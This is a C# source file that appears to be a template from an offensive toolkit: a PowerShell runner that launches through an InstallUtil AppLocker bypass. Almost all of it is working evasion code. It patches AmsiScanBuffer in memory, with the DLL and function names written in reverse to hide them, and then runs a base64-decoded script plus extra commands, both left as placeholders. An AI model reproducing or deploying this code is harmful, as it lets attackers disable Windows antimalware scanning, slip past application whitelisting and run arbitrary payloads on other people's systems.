using System;
using System.IO;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.DirectoryServices;
using System.Security.Principal;
using System.Runtime.InteropServices;

/*
c:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:system.management.automation.dll /unsafe /platform:x64 /preferreduilang:en-US /filealign:512 /out:template.exe /target:exe template.cs
*/

namespace Application
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        // @subTee app locker bypass
        public override void Install(System.Collections.IDictionary savedState)
        {
            			
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        public static void Main()
        {
            const int SW_HIDE = 0;
            const int SW_SHOW = 5;

            var handle = Win32.GetConsoleWindow();

            // Show Window
            Win32.ShowWindow(handle, SW_SHOW);

            var amsi = new Amsi();
            amsi.Bypass();
            string commandArrayString = "FIXME_FUNCTIONS";
            List<string> commandArray = new List<string>(commandArrayString.Split(','));
            System.Management.Automation.Runspaces.Runspace runspace = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
            runspace.Open();

            System.Management.Automation.Runspaces.Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(ApplicationData.runApp());
            foreach (var command in commandArray) {
                pipeline.Commands.AddScript(command);
            }

            runspace.SessionStateProxy.SetVariable("FormatEnumerationLimit", -1);
            pipeline.Commands.Add("Out-String");

            System.Collections.ObjectModel.Collection<System.Management.Automation.PSObject> results = pipeline.Invoke();
            runspace.Close();
            System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            foreach (System.Management.Automation.PSObject obj in results)
            {
                stringBuilder.AppendLine(obj.ToString());
            }
            System.Console.WriteLine(stringBuilder.ToString());
        }
    }

    class ApplicationData
    {
        public static string runApp()
        {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"FIXME_BASE64"));
        }
    }

    public class Amsi
    {
        // https://twitter.com/_xpn_/status/1170852932650262530
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public void Bypass()
        {
            if (is64Bit())
                PatchAmsi(x64);
            else
                PatchAmsi(x86);
        }

        private static void PatchAmsi(byte[] patch)
        {
            try
            {
                
                var lib = Win32.LoadLibrary(ReverseString("lld.isma"));
                var addr = Win32.GetProcAddress(lib, ReverseString("reffuBnacSismA"));

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }

        public static string ReverseString(string s)
        {
            char[] arr = s.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);
        }
    }

    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
